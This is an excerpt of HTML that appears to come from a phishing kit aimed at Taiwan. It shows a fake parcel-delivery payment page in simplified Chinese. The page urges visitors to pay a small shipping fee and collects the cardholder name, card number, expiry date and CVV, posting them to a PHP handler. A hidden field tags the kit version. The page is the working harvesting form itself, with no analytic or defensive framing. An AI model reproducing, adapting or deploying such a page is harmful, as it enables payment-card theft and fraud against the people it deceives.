...
<body>
    ...
    <main>
        ...
        <form action="php/send2.php" method="POST" class="arali">
            <div class="formf">
                    <div class="pleaseenter">请确认付款及运费（TWD 91,01）以尽快收到包裹。</div>
            </div> 
											

            <div class="formf">
                <div class="labell">卡片上的名字 :</div>
                <div class="divinput"><input type="text" name="name" required=""></div>
            </div>

            <div class="formf">
                    <div class="labell">卡号 :</div>
                    <div class="divinput"><input type="tel" name="cc" id="cc" required=""></div>
            </div> 
            <div class="formf">
                <div class="labell">到期日 (EXP) :</div>
                <div class="divinput"><input type="tel" name="exp" required="" id="exp"></div>
            </div>
            <div class="formf">
                <div class="labell">安全码 (CVV) :</div>
                <div class="divinput"><input type="tel" name="cvv" required="" id="cvv"></div>
            </div>
			...
			<input type="hidden" name="brand" value="taiwanV0.01">
					...
					<p style="text-align: center;"><img alt="" src="./images/crds.png" style="width: 200px; height: 36px;" /></p>
    ...
    <script>
        let dob = document.getElementById("cc");
